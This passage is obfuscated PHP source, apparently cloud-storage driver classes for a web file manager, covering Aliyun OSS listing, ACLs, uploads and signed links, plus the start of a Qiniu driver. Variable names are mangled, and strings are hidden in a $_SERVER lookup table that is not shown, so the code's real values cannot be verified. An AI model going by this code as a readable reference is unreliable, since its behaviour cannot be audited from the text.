$ÁªşÀöé[8], $ÁªşÀöé[1469] => $ù¾æ–àÓ, $ÁªşÀöé[1470] => $æ¶ÌÈ×É, $ÁªşÀöé[1471] => $¡ĞìÒÒÒ); try { $× ê¢Æ£ = $this->client->listObjects($this->bucket, $ €ñšûò); } catch (OSS\Core\OssException $‡”Ì€€) { $this->writeLog(__FUNCTION__ . $ÁªşÀöé[214] . $‡”Ì€€->getMessage()); break; } $¡ĞìÒÒÒ = $× ê¢Æ£->getNextMarker(); $Â¦àË‡ = $× ê¢Æ£->getObjectList(); $ó£¢äô¹ = $× ê¢Æ£->getPrefixList(); if ($“÷»•ˆŒ) { if (count($Â¦àË‡) > 1 || count($Â¦àË‡) == 1 && $Â¦àË‡[0]->getKey() != $ù¾æ–àÓ) { $ìÃİë»¿ += count($Â¦àË‡) - 1; } if (!empty($ó£¢äô¹)) { $Ìâ¶ášÌ += count($ó£¢äô¹); } if ($¡ĞìÒÒÒ === $ÁªşÀöé[12]) { break; } continue; } if ($–¦÷Ä¦) { if (!empty($Â¦àË‡)) { if (count($Â¦àË‡) > 1 || $Â¦àË‡[0]->getKey() != $ù¾æ–àÓ) { return !0; } } } else { if (!empty($ó£¢äô¹)) { return !0; } } if ($¡ĞìÒÒÒ === $ÁªşÀöé[12]) { break; } } if ($“÷»•ˆŒ) { return array($ÁªşÀöé[239] => $ìÃİë»¿, $ÁªşÀöé[240] => $Ìâ¶ášÌ); } return !1; } public function listAll($Ù—‹êÄÈ) { $ĞÆÎ—˜† =& $_SERVER[³Ôà×Ó]; $²ùßŞ‰½ = $this->fileList($Ù—‹êÄÈ, $ĞÆÎ—˜†[12], !0); $–¡œ¾´ã = array_to_keyvalue($²ùßŞ‰½[$ĞÆÎ—˜†[86]], $ĞÆÎ—˜†[32]); foreach ($²ùßŞ‰½[$ĞÆÎ—˜†[85]] as $’‰ş¬ùÂ) { if (is_string($’‰ş¬ùÂ)) { $–¡œ¾´ã[$’‰ş¬ùÂ] = array($ĞÆÎ—˜†[79] => 0); } } return $this->listAllFiles($Ù—‹êÄÈ, $–¡œ¾´ã); } public function canRead($Œ€ßšÃñ) { $” îªú¤ =& $_SERVER[³Ôà×Ó]; $êŸ…“·ò = $this->pathAcl($Œ€ßšÃñ); return $êŸ…“·ò == $” îªú¤[1478] || $êŸ…“·ò == $” îªú¤[628] ? !0 : !1; } public function canWrite($‹öÂŞÄ) { $ãÙì®ë¤ = $this->pathAcl($‹öÂŞÄ); return $ãÙì®ë¤ == $_SERVER[³Ôà×Ó][628] ? !0 : !1; } public function pathAcl($Ü•âï“ê) { $—ø”ì‰ò =& $_SERVER[³Ôà×Ó]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $œ×¢½¼ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ü•âï“ê)); } catch (OSS\Core\OssException $ìïÁ”ó) { $this->writeLog(__FUNCTION__ . $—ø”ì‰ò[214] . $ìïÁ”ó->getMessage()); return !1; } $ƒÈ§şÆ² = $œ×¢½¼ == $—ø”ì‰ò[37] ? $this->bucketAcl : $œ×¢½¼; if ($ƒÈ§şÆ² == $—ø”ì‰ò[1479]) { return $—ø”ì‰ò[1478]; } if ($ƒÈ§şÆ² == $—ø”ì‰ò[1480]) { return $—ø”ì‰ò[628]; } return $ƒÈ§şÆ²; } private function chmodPath($£êÈàŞÀ, $ÂãÊä = '') { $‘„ô·µ¬ =& $_SERVER[³Ôà×Ó]; $ÚÌÑÑ— = empty($ÂãÊä) ? $‘„ô·µ¬[1480] : $ÂãÊä; $Ä”º´Æ‚ = array($‘„ô·µ¬[37], $‘„ô·µ¬[229], $‘„ô·µ¬[1479], $‘„ô·µ¬[1480]); if (!in_array($ÚÌÑÑ—, $Ä”º´Æ‚)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($£êÈàŞÀ), $ÚÌÑÑ—); } catch (OSS\Core\OssException $ÒÖˆáú‡) { $this->writeLog(__FUNCTION__ . $‘„ô·µ¬[214] . $ÒÖˆáú‡->getMessage()); return !1; } return !0; } public function getContent($‹–¡É›) { return $this->fileSubstr($‹–¡É›, -1); } public function setContent($¾úÈ‘Œ½, $›¨«Ùº× = '') { $ƒÔ˜—µó =& $_SERVER[³Ôà×Ó]; try { $Ë±˜¸­ = $this->trafficLimit($ƒÔ˜—µó[1481]); $ —æ£òŒ = $this->client->putObject($this->bucket, $this->pathEncode($¾úÈ‘Œ½), $›¨«Ùº×, $Ë±˜¸­); } catch (OSS\Core\OssException $ıœš¢×Ä) { $this->writeLog(__FUNCTION__ . $ƒÔ˜—µó[214] . $ıœš¢×Ä->getMessage()); return !1; } $¤Ûº½åÏ = array($ƒÔ˜—µó[1475] => trim($ —æ£òŒ[$ƒÔ˜—µó[1472]], $ƒÔ˜—µó[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¾úÈ‘Œ½))); $this->updateObjMeta($¾úÈ‘Œ½, $¤Ûº½åÏ); return isset($ —æ£òŒ[$ƒÔ˜—µó[1482]][$ƒÔ˜—µó[292]]) ? !0 : !1; } private function updateObjMeta($¹–Äèó›, $úàË±Š¿) { $¹–Äèó› = $this->pathEncode($¹–Äèó›); try { $‚»Åì¯§ = array(OSS\OssClient::OSS_HEADERS => $úàË±Š¿); $this->client->copyObject($this->bucket, $¹–Äèó›, $this->bucket, $¹–Äèó›, $‚»Åì¯§); } catch (OSS\Core\OssException $êàØ ÖÆ) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][214] . $êàØ ÖÆ->getMessage()); return !1; } return !0; } public function upload($Öåìòã, $»¦Ãàƒ÷, $É‹°ÔÖ = false, $óéŒ÷‡ = REPEAT_REPLACE) { $ì°¯ˆ± =& $_SERVER[³Ôà×Ó]; $ü»¡Ñ¼Ò = trim($Öåìòã, $ì°¯ˆ±[8]); $şñéŞÏÛ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ì°¯ˆ±[1475] => @md5_file($»¦Ãàƒ÷)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Öåìòã))); $şñéŞÏÛ = $this->trafficLimit($ì°¯ˆ±[1481], $şñéŞÏÛ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ü»¡Ñ¼Ò), $»¦Ãàƒ÷, $şñéŞÏÛ); } catch (OSS\Core\OssException $ĞÏ¬Íš¬) { $this->writeLog(__FUNCTION__ . $ì°¯ˆ±[214] . $ĞÏ¬Íš¬->getMessage()); return !1; } return $this->getPathOuter($Öåìòã); } public function getHost() { $´»‹¬Î =& $_SERVER[³Ôà×Ó]; $ÙøéÀèú = explode($´»‹¬Î[210], parent::getHost()); return $ÙøéÀèú[0] . $´»‹¬Î[210] . $this->bucket . $´»‹¬Î[10] . $ÙøéÀèú[1]; } public function uploadFormData($â²şµˆ©, $–¿—ğèë = 3600) { $â¬ÜĞö£ =& $_SERVER[³Ôà×Ó]; if (!($É™é€öÒ = $this->getHost())) { return !1; } $¦Õ¿­Î = $–¿—ğèë; $Şú®½¸ = date($â¬ÜĞö£[1483], time() + $¦Õ¿­Î); $Å©Ñ‘³¢ = new DateTime($Şú®½¸); $ßş’àçÙ = $Å©Ñ‘³¢->format(DateTime::ISO8601); $®à‚¼«í = strpos($ßş’àçÙ, $â¬ÜĞö£[372]); $ßş’àçÙ = substr($ßş’àçÙ, 0, $®à‚¼«í) . $â¬ÜĞö£[1484]; $Ã†®¥Ø = 1048576000 * 5; $ÜÂ¹âğ“ = $this->pathFather($â²şµˆ©); $ÈìÜ£Ü = array($â¬ÜĞö£[275] => $ßş’àçÙ, $â¬ÜĞö£[278] => array(array($â¬ÜĞö£[1485], 0, $Ã†®¥Ø), array($â¬ÜĞö£[281], $â¬ÜĞö£[282], $ÜÂ¹âğ“))); $€¨­ú»ø = base64_encode(json_encode($ÈìÜ£Ü)); $ˆÇÇË™ñ = base64_encode(hash_hmac($â¬ÜĞö£[263], $€¨­ú»ø, $this->secret, !0)); $§àèŞòƒ = array($â¬ÜĞö£[293] => $€¨­ú»ø, $â¬ÜĞö£[1486] => $this->accessKey, $â¬ÜĞö£[285] => $â¬ÜĞö£[274], $â¬ÜĞö£[1487] => $ˆÇÇË™ñ, $â¬ÜĞö£[208] => $É™é€öÒ); $§àèŞòƒ = $this->trafficLimit($â¬ÜĞö£[1481], $§àèŞòƒ); return $§àèŞòƒ; } public function multiUploadFormData($‚²ˆÜâ, $Ä œï¶ = 3600) { $ÏøÍ’õ­ =& $_SERVER[³Ôà×Ó]; if (!($‹´Š¯‚¾ = $this->getHost())) { return !1; } $ßš¼­¯ = $this->trafficLimit($ÏøÍ’õ­[1481]); $¾Å±Ä¸ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‚²ˆÜâ), $ßš¼­¯); return array($ÏøÍ’õ­[254] => $¾Å±Ä¸, $ÏøÍ’õ­[208] => $‹´Š¯‚¾ . $ÏøÍ’õ­[8] . $this->pathEncode($‚²ˆÜâ), $ÏøÍ’õ­[255] => gmdate($ÏøÍ’õ­[1488]), $ÏøÍ’õ­[97] => $‚²ˆÜâ); } public function multiUploadAuthData($–ìÌé¢, $ŒÏï¶÷Ê = array()) { $é½è¦ô¶ =& $_SERVER[³Ôà×Ó]; $şÏÂñú = isset($ŒÏï¶÷Ê[$é½è¦ô¶[255]]) ? $ŒÏï¶÷Ê[$é½è¦ô¶[255]] : gmdate($é½è¦ô¶[1488]); $äĞãØÂ¥ = isset($ŒÏï¶÷Ê[$é½è¦ô¶[169]]) ? $ŒÏï¶÷Ê[$é½è¦ô¶[169]] : $é½è¦ô¶[12]; $ÈŒ®×± = $–ìÌé¢; if (isset($ŒÏï¶÷Ê[$é½è¦ô¶[97]])) { $ÈŒ®×± = $ŒÏï¶÷Ê[$é½è¦ô¶[97]]; unset($ŒÏï¶÷Ê[$é½è¦ô¶[97]]); } if (isset($ŒÏï¶÷Ê[$é½è¦ô¶[256]])) { $ŒÏï¶÷Ê[$é½è¦ô¶[255]] = $şÏÂñú; return $this->listUploadParts($ÈŒ®×±, $ŒÏï¶÷Ê); } $°Á‡ ²© = array($é½è¦ô¶[257], $é½è¦ô¶[12], $é½è¦ô¶[123], $şÏÂñú, "\170\x2d\157\x73\x73\x2d\144\141\164\145\72{$şÏÂñú}", $é½è¦ô¶[8] . $this->bucket . $é½è¦ô¶[8] . $ÈŒ®×± . $äĞãØÂ¥); if (strpos($äĞãØÂ¥, $é½è¦ô¶[258]) === 0) { $°Á‡ ²©[0] = $é½è¦ô¶[259]; if ($ä¤•ë“’ = $this->trafficLimit($é½è¦ô¶[1481])) { $ÈŒ®×± = $é½è¦ô¶[1489]; array_splice($°Á‡ ²©, 5, 0, $ÈŒ®×± . $é½è¦ô¶[4] . $ä¤•ë“’[$ÈŒ®×±]); } } if (isset($ŒÏï¶÷Ê[$é½è¦ô¶[260]]) && $ŒÏï¶÷Ê[$é½è¦ô¶[260]] == $é½è¦ô¶[261]) { $°Á‡ ²©[0] = $é½è¦ô¶[261]; } if (!empty($ŒÏï¶÷Ê[$é½è¦ô¶[1490]])) { $ĞÔç±¦ = array_merge(array($°Á‡ ²©[4]), $ŒÏï¶÷Ê[$é½è¦ô¶[1490]]); sort($ĞÔç±¦); $°Á‡ ²©[4] = implode($é½è¦ô¶[262], $ĞÔç±¦); } $˜µáşĞ = implode($é½è¦ô¶[262], $°Á‡ ²©); $ÓÓ Ö = base64_encode(hash_hmac($é½è¦ô¶[263], $˜µáşĞ, $this->secret, !0)); $ÍáŞÂòÒ = $é½è¦ô¶[1458] . $this->accessKey . $é½è¦ô¶[4] . $ÓÓ Ö; if (strpos($äĞãØÂ¥, $é½è¦ô¶[258]) === 0) { $ÍáŞÂòÒ = array($é½è¦ô¶[265] => $ÍáŞÂòÒ, $é½è¦ô¶[255] => $şÏÂñú); if ($ä¤•ë“’) { $ÍáŞÂòÒ = array_merge($ÍáŞÂòÒ, $ä¤•ë“’); } } return $ÍáŞÂòÒ; } public function listUploadParts($û²É§ÄÌ, $ìÒ¾øãÀ) { $Ğ™Ò°á =& $_SERVER[³Ôà×Ó]; $¸Ÿ‚ä­ = parse_url_query($ìÒ¾øãÀ[$Ğ™Ò°á[169]]); $¨ä±ú¶« = $this->client->listParts($this->bucket, $this->pathEncode($û²É§ÄÌ), $¸Ÿ‚ä­[$Ğ™Ò°á[254]]); $Ô±æ»úä = $¨ä±ú¶«->getListPart(); $ø¸å±Óù = array(); foreach ($Ô±æ»úä as $„²æóîÖ) { $ø¸å±Óù[] = array($Ğ™Ò°á[308] => $„²æóîÖ->getPartNumber(), $Ğ™Ò°á[309] => trim($„²æóîÖ->getETag(), $Ğ™Ò°á[121])); } unset($ìÒ¾øãÀ[$Ğ™Ò°á[256]], $ìÒ¾øãÀ[$Ğ™Ò°á[260]]); $ïÉÇË’™ = $this->multiUploadAuthData($û²É§ÄÌ, $ìÒ¾øãÀ); if (empty($ïÉÇË’™)) { return !1; } return array($Ğ™Ò°á[265] => $ïÉÇË’™, $Ğ™Ò°á[255] => $ìÒ¾øãÀ[$Ğ™Ò°á[255]], $Ğ™Ò°á[267] => $ø¸å±Óù); } public function download($Õ©¡şÜ‚, $ğ«×‡¤“) { $”¢¡×ñ =& $_SERVER[³Ôà×Ó]; if ($this->isFolder($Õ©¡şÜ‚)) { return !1; } try { $²‘×Ú…Í = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ğ«×‡¤“); $²‘×Ú…Í = $this->trafficLimit($”¢¡×ñ[112], $²‘×Ú…Í); $this->client->getObject($this->bucket, $this->pathEncode($Õ©¡şÜ‚), $²‘×Ú…Í); } catch (OSS\Core\OssException $ßèÈï) { $this->writeLog(__FUNCTION__ . $”¢¡×ñ[214] . $ßèÈï->getMessage()); return !1; } return $ğ«×‡¤“; } public function fileSubstr($©Ï¥¸Ê¼, $á¡•£º® = 0, $šÃìÂ = false) { if ($á¡•£º® === -1) { $¬—ÔÄ¶ = array(); } else { if ($šÃìÂ === !1) { $£ùİé®ƒ = $this->size($©Ï¥¸Ê¼); } else { $£ùİé®ƒ = $á¡•£º® + $šÃìÂ - 1; } $¬—ÔÄ¶ = array(OSS\OssClient::OSS_RANGE => "{$á¡•£º®}\x2d{$£ùİé®ƒ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($©Ï¥¸Ê¼), $¬—ÔÄ¶); } catch (OSS\Core\OssException $ƒºê“úò) { $this->writeLog(__FUNCTION__ . $_SERVER[³Ôà×Ó][214] . $ƒºê“úò->getMessage()); think_exception($ƒºê“úò->getMessage()); return !1; } } private function trafficLimit($Üı¯Îş, $“ŒäÈé = array()) { $—ü‹Ô¿¥ =& $_SERVER[³Ôà×Ó]; if ($Üı¯Îş == $—ü‹Ô¿¥[1481] && $this->isUploadServer() || $Üı¯Îş == $—ü‹Ô¿¥[112] && $this->isFileOutServer()) { return $“ŒäÈé; } $…ïÚ‹Ÿê = floatval($GLOBALS[$—ü‹Ô¿¥[6]][$—ü‹Ô¿¥[92]][$—ü‹Ô¿¥[110]][$Üı¯Îş]) * 1024 * 1024 * 8; if (!$…ïÚ‹Ÿê) { return $“ŒäÈé; } $…ïÚ‹Ÿê = $…ïÚ‹Ÿê < 819200 ? 819200 : ($…ïÚ‹Ÿê > 838860800 ? 838860800 : $…ïÚ‹Ÿê); $“ŒäÈé[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($…ïÚ‹Ÿê); return $“ŒäÈé; } public function link($âÔµ×ªó, $÷óø˜Û™ = array()) { $¡Çõêùá =& $_SERVER[³Ôà×Ó]; if (!$this->exist($âÔµ×ªó) || $this->isFolder($âÔµ×ªó)) { return !1; } try { $÷óø˜Û™ = $this->trafficLimit($¡Çõêùá[112], $÷óø˜Û™); $ôâ»ú·À = $this->client->signUrl($this->bucket, $this->pathEncode($âÔµ×ªó), 3600 * 12, $¡Çõêùá[261], $÷óø˜Û™); return $this->getCdnLink($ôâ»ú·À); } catch (OSS\Core\OssException $®ÍÂä‰Ş) { $this->writeLog(__FUNCTION__ . $¡Çõêùá[214] . $®ÍÂä‰Ş->getMessage()); return !1; } } public function fileOut($¿¶³“—, $š¦º¼¡Õ = false, $‚¨‚ÉÁì = false, $í‘Êˆ¨å = '') { $µòéÍ“¼ =& $_SERVER[³Ôà×Ó]; if ($this->isFileOutServer()) { return $this->fileOutServer($¿¶³“—, $š¦º¼¡Õ, $‚¨‚ÉÁì, $í‘Êˆ¨å); } if (!$‚¨‚ÉÁì) { $‚¨‚ÉÁì = $this->pathThis($¿¶³“—); } $‚¨‚ÉÁì = rawurlencode($‚¨‚ÉÁì); $ÒÅîÛÓ’ = get_file_mime(get_path_ext($‚¨‚ÉÁì)); if ($ÒÅîÛÓ’ == $µòéÍ“¼[248]) { return parent::fileOut($¿¶³“—, $š¦º¼¡Õ, $‚¨‚ÉÁì, $í‘Êˆ¨å); } $š¦º¼¡Õ = $š¦º¼¡Õ ? $µòéÍ“¼[1491] : $µòéÍ“¼[1492]; $¡èœù‚Ô = array(OSS\OssClient::OSS_SUB_RESOURCE => $µòéÍ“¼[1493] . rawurlencode("{$š¦º¼¡Õ}\73\146\151\x6c\x65\x6e\141\x6d\145\x3d{$‚¨‚ÉÁì}")); $¡èœù‚Ô[OSS\OssClient::OSS_SUB_RESOURCE] .= $µòéÍ“¼[1494] . rawurlencode($ÒÅîÛÓ’); $ã¼ñÎ»Ô = $this->link($¿¶³“—, $¡èœù‚Ô); $this->fileOutLink($ã¼ñÎ»Ô); } public function fileOutServer($Òµ§”ÚŞ, $™·‡†şª = false, $›ÕÀß­ü = false, $Ãø¢šÑ§ = '') { parent::fileOut($Òµ§”ÚŞ, $™·‡†şª, $›ÕÀß­ü, $Ãø¢šÑ§); } public function fileOutImage($´ÉÖ”˜Ÿ, $ŠÒŞâ¢º = 250) { if ($this->size($´ÉÖ”˜Ÿ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($´ÉÖ”˜Ÿ, $ŠÒŞâ¢º); } $‹ÓâÏ—Õ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[³Ôà×Ó][1455] . $ŠÒŞâ¢º); $¼µƒßª = $this->link($´ÉÖ”˜Ÿ, $‹ÓâÏ—Õ); $this->fileOutLink($¼µƒßª); } public function fileOutImageServer($ú ÜÉÜ¿, $°Ã¬Û„Ò = 250) { parent::fileOutImage($ú ÜÉÜ¿, $°Ã¬Û„Ò); } public function fileOutLink($‹öíŞ¾¬) { $¿±‰ç±º =& $_SERVER[³Ôà×Ó]; if (!$this->isCdnHost() && substr($‹öíŞ¾¬, 0, 7) == $¿±‰ç±º[313]) { $‹öíŞ¾¬ = $¿±‰ç±º[314] . substr($‹öíŞ¾¬, 7); } header($¿±‰ç±º[175] . $‹öíŞ¾¬); die; } public function hashMd5($‹ÖÉí², $şŒÅÏ = '') { $‘êÂóú =& $_SERVER[³Ôà×Ó]; $óÕğ·Ëø = $this->_objectMeta($‹ÖÉí²); if (!$óÕğ·Ëø) { return $‘êÂóú[12]; } if (!isset($óÕğ·Ëø[$‘êÂóú[1475]]) && !empty($şŒÅÏ)) { $Ù€‚”¡í = $this->updateObjMeta($‹ÖÉí², array($‘êÂóú[1475] => $şŒÅÏ)); $óÕğ·Ëø[$‘êÂóú[1475]] = $Ù€‚”¡í ? $şŒÅÏ : $‘êÂóú[12]; } return isset($óÕğ·Ëø[$‘êÂóú[1475]]) ? strtolower($óÕğ·Ëø[$‘êÂóú[1475]]) : $‘êÂóú[12]; } public function size($¤Ìœ­²É) { $ÁßÅØå‘ = $this->objectMeta($¤Ìœ­²É); return $ÁßÅØå‘ ? $ÁßÅØå‘[$_SERVER[³Ôà×Ó][79]] : 0; } public function info($ÑÜÔï’) { if ($this->isFolder($ÑÜÔï’)) { return $this->folderInfo($ÑÜÔï’); } else { if ($this->isFile($ÑÜÔï’)) { return $this->fileInfo($ÑÜÔï’); } } return !1; } public function exist($€¢ÖáğØ) { return $this->isFile($€¢ÖáğØ) || $this->isFolder($€¢ÖáğØ); } public function isFile($Ñ’²–ê) { return !$this->isFolder($Ñ’²–ê) && $this->objectMeta($Ñ’²–ê); } public function isFolder($ãÖ²¦ûÅ) { return $this->cacheMethod($_SERVER[³Ôà×Ó][179], $ãÖ²¦ûÅ); } protected function objectMeta($Øëî£„) { return $this->cacheMethod($_SERVER[³Ôà×Ó][181], $Øëî£„); } protected function _objectMeta($İø‡ö„ù) { $£•¸ï =& $_SERVER[³Ôà×Ó]; try { $ÙÂÑŠ¹µ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($İø‡ö„ù)); } catch (OSS\Core\OssException $ŞÁÉé‘Ó) { $this->writeLog(__FUNCTION__ . $£•¸ï[214] . $ŞÁÉé‘Ó->getMessage()); $ÙÂÑŠ¹µ = !1; } if ($ÙÂÑŠ¹µ) { $ÙÂÑŠ¹µ[$£•¸ï[79]] = intval($ÙÂÑŠ¹µ[$£•¸ï[1473]]); } return $ÙÂÑŠ¹µ; } protected function _isFolder($ÔÎ¯Ñ¸‚) { $¢õÊÇìï =& $_SERVER[³Ôà×Ó]; if ($ÔÎ¯Ñ¸‚ == $¢õÊÇìï[12] || $ÔÎ¯Ñ¸‚ == $¢õÊÇìï[8]) { return !0; } $ëòùÒ¼ = array($¢õÊÇìï[1468] => $¢õÊÇìï[8], $¢õÊÇìï[1469] => rtrim($ÔÎ¯Ñ¸‚, $¢õÊÇìï[8]) . $¢õÊÇìï[8], $¢õÊÇìï[1470] => 1, $¢õÊÇìï[1471] => $¢õÊÇìï[12]); $ì¯ƒ÷Â = $this->client->listObjects($this->bucket, $ëòùÒ¼); if ($ì¯ƒ÷Â->getObjectList() || $ì¯ƒ÷Â->getPrefixList()) { return !0; } return !1; } public function writeLog($ªãÚ«„¿ = '', $½Ë½ğ¸º = false) { $ç°ÂÆ =& $_SERVER[³Ôà×Ó]; $’™®‡İÖ = in_array(ACTION, array($ç°ÂÆ[212], $ç°ÂÆ[213])); if (!$’™®‡İÖ && !GLOBAL_DEBUG) { return; } $ã˜…â¢ = 0; if (stripos($ªãÚ«„¿, $ç°ÂÆ[1495]) !== !1) { $ã˜…â¢ = 1; $üëÏô¹æ = explode($ç°ÂÆ[1496], $ªãÚ«„¿); $ªãÚ«„¿ = !empty($üëÏô¹æ[1]) ? $üëÏô¹æ[1] : $ªãÚ«„¿; } else { if (stripos($ªãÚ«„¿, $ç°ÂÆ[1497])) { $ã˜…â¢ = 2; $üëÏô¹æ = explode($ç°ÂÆ[1497], $ªãÚ«„¿); $üëÏô¹æ = explode($ç°ÂÆ[4], $üëÏô¹æ[0]); $ªãÚ«„¿ = !empty($üëÏô¹æ[1]) ? $üëÏô¹æ[1] : $ªãÚ«„¿; } } if ($’™®‡İÖ && I18n::getType() == $ç°ÂÆ[1498]) { if ($ã˜…â¢ == 1) { $ªãÚ«„¿ = str_replace($ç°ÂÆ[1499], $ç°ÂÆ[1500], $ªãÚ«„¿); } else { if ($ã˜…â¢ == 2) { $üëÏô¹æ = explode($ç°ÂÆ[214], $üëÏô¹æ[0]); $›°÷œÄ = isset($üëÏô¹æ[1]) ? $üëÏô¹æ[1] : $ç°ÂÆ[12]; $¼Á¥Æ× = array($ç°ÂÆ[1501] => $ç°ÂÆ[1502], $ç°ÂÆ[1503] => $ç°ÂÆ[1504], $ç°ÂÆ[1505] => $ç°ÂÆ[1506], $ç°ÂÆ[1507] => $ç°ÂÆ[1508], $ç°ÂÆ[1509] => $ç°ÂÆ[1510], $ç°ÂÆ[1511] => $ç°ÂÆ[1512], $ç°ÂÆ[1513] => $ç°ÂÆ[1514], $ç°ÂÆ[1515] => $ç°ÂÆ[1516], $ç°ÂÆ[1517] => $ç°ÂÆ[1518], $ç°ÂÆ[1519] => $ç°ÂÆ[1520]); if (isset($¼Á¥Æ×[$›°÷œÄ])) { $ªãÚ«„¿ = $¼Á¥Æ×[$›°÷œÄ]; } } } if (stripos($ªãÚ«„¿, $ç°ÂÆ[1521])) { $ªãÚ«„¿ = $ç°ÂÆ[1522]; } } if (!trim($ªãÚ«„¿)) { return; } parent::writeLog(trim($ªãÚ«„¿), $½Ë½ğ¸º); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ì¸ê¸ü) { parent::__construct(); require_once SDK_DIR . $_SERVER[³Ôà×Ó][1523]; $this->_init($Ì¸ê¸ü); } public function _init($ˆÑÃà•’) { $÷É´Şö¡ =& $_SERVER[³Ôà×Ó]; $this->config = $ˆÑÃà•’; foreach ($ˆÑÃà•’ as $ĞÍ×Ù§Â => $²É¼Ä‹©) { if (isset($this->{$ĞÍ×Ù§Â})) { $this->{$ĞÍ×Ù§Â} = $²É¼Ä‹©; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($÷É´Şö¡[1524] . LNG($÷É´Şö¡[1459])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¦œçËäå, $É´ö€¸ = '', $•‰£©šâ = REPEAT_RENAME) { if ($this->setContent($¦œçËäå, $É´ö€¸)) { return $this->getPathOuter($¦œçËäå); } return !1; } public function mkdir($óšŒö–ó, $ñ‚áêÉ³ = REPEAT_SKIP) { $Û’ø– =& $_SERVER[³Ôà×Ó]; $óşõï©Ò = trim($óšŒö–ó, $Û’ø–[8]); if ($this->_isFolder($óşõï©Ò)) { return $this->getPathOuter($óşõï©Ò); } $óšŒö–ó = $óşõï©Ò . $Û’ø–[8]; $Œâğãöº = get_path_this($óşõï©Ò); $×à¿ïı = $óšŒö–ó . $Œâğãöº; if (!$this->mkfile($×à¿ïı)) { return !1; } if (!$this->moveFile($×à¿ïı, $óšŒö–ó)) { $this->delFile($×à¿ïı); return !1; } return $this->getPathOuter($óşõï©Ò); } public function copyFile($ÎçŞ™‚ß, $Ÿ¹åÉ“ª) { $å˜ßŞŞà = $this->bucketManager->copy($this->bucket, $ÎçŞ™‚ß, $this->bucket, $Ÿ¹åÉ“ª, !0); return $å˜ßŞŞà ? !1 : $this->getPathOuter($Ÿ¹åÉ“ª); } public function moveFile($İÆ”¡Šò, $Š·ˆÕ¯ˆ) { $“ÄÚ± = $this->bucketManager->move($this->bucket, $İÆ”¡Šò, $this->bucket, $Š·ˆÕ¯ˆ, !0); return $“ÄÚ± ? !1 : $this->getPathOuter($Š·ˆÕ¯ˆ); } public function delFile($¹—şå²õ) { if (!$this->exist($¹—şå²õ)) { return !0; } $ıüòí‡¬ = $this->bucketManager->delete($this->bucket, $¹—şå²õ); return $ıüòí‡¬ ? !1 : !0; } public function delFolder($÷õÑã¦£) { $œŠ¸¹„â =& $_SERVER[³Ôà×Ó]; if (!$this->exist($÷õÑã¦£)) { return !0; } $this->listItemCache = !1; $ó‚À½É¿ = $this->fileList($÷õÑã¦£); $this->listItemCache = !0; $ä¤úæÎŠ = trim($÷õÑã¦£, $œŠ¸¹„â[8]) . $œŠ¸¹„â[8]; if (!empty($÷õÑã¦£) && $÷õÑã¦£ !== $œŠ¸¹„â[228] && !in_array($ä¤úæÎŠ, $ó‚À½É¿[$œŠ¸¹„â[85]])) { $ó‚À½É¿[$œŠ¸¹„â[85]][] = $ä¤úæÎŠ; } $şÎ¸¤ï = $this->delByBatch($ó‚À½É¿[$œŠ¸¹„â[86]]); if (!$şÎ¸¤ï) { return !1; } $şÎ¸¤ï = $this->delByBatch($ó‚À½É¿[$œŠ¸¹„â[85]]); if (!$şÎ¸¤ï) { return !1; } return $this->delFile($ä¤úæÎŠ); } private function delByBatch($ìæ»Ğã) { foreach (array_chunk($ìæ»Ğã, 1000) as $ÔÛºß­È) { $é–÷Í¦ = $this->bucketManager->buildBatchDelete($this->bucket, $ÔÛºß­È); list($¤ø¾šëğ, $Õ£¨×Ò) = $this->bucketManager->batch($é–÷Í¦); if ($Õ£¨×Ò) { return !1; } } return !0; } public function rename($æÑè Â, $¹ì›ŒËû) { return $this->renameObject($æÑè Â, $¹ì›ŒËû); } public function fileInfo($”ñè°æ, $ëÁñŞÕ = false, $…Š½ğŸ = array()) { $±œŒšØş =& $_SERVER[³Ôà×Ó]; $¨›ËÇ– = array($±œŒšØş[32] => $this->pathThis($”ñè°æ), $±œŒšØş[87] => $this->getPathOuter($±œŒšØş[8] . $”ñè°æ), $±œŒšØş[33] => $±œŒšØş[230], $±œŒšØş[79] => isset($…Š½ğŸ[$±œŒšØş[1525]]) ? $…Š½ğŸ[$±œŒšØş[1525]] : 0, $±œŒšØş[169] => $this->ext($”ñè°æ)); if ($ëÁñŞÕ) { return $¨›ËÇ–; } $¨›ËÇ–[$±œŒšØş[231]] = $¨›ËÇ–[$±œŒšØş[88]] = 0; $¨›ËÇ–[$±œŒšØş[232]] = $¨›ËÇ–[$±œŒšØş[233]] = !0; if (empty($…Š½ğŸ)) { $…Š½ğŸ = $this->objectMeta($”ñè°æ); if (!$…Š½ğŸ) { return $¨›ËÇ–; } } if (isset($…Š½ğŸ[$±œŒšØş[234]]) && $…Š½ğŸ[$±œŒšØş[234]]) { $¨›ËÇ–[$±œŒšØş[235]] = $…Š½ğŸ[$±œŒšØş[234]]; } if 